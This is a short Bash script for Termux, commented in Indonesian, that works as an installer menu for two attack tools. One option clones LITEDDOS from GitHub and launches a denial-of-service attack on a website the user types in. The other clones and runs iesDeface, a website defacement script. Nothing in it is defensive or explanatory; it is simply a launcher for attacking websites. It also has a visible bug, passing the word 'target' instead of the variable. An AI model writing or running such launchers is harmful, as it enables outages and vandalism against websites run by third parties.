#!/system/xbin/bash
#Author InYouDfv47
#Selamat Belajar

clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'    

figlet Bahauddin | lolcat
echo $cyan"Membuat Tools Instaler Sendiri Di Termux"
echo $green"Daftar Toolsnya=>"
echo $purple"[1] DDOS Website Dengan LITEDDOS"
echo $purple"[2] iesDeface"
echo
echo $green
read -p "╭─[Pilih Nomer]
╰─root@Dfv47=•>" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo $green"Installing LITEDDOS..."
sleep 1
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
figlet "Mr.B4J1N64N" | lolcat
sleep 1 
apt install git
apt install bash
pip2 install bash
git clone https://github.com/ALX-04/iesDEFACE
mv iesDEFACE $HOME
cd $HOME/iesDEFACE
bash iesDeface.sh
fi
